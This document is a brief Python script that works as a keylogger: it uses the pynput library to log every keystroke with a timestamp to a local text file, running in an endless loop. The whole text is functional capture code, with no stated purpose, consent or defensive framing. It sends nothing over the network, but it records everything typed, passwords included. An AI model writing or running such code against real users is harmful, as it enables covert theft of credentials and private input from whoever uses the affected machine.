import pynput
import datetime
def on_press(key):
    with open(".\\all-things\\keylog.txt", "a") as log_file:
        log_file.write(f"{datetime.datetime.now()}: {key}\n")

def on_release(key):
    pass

while True:
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
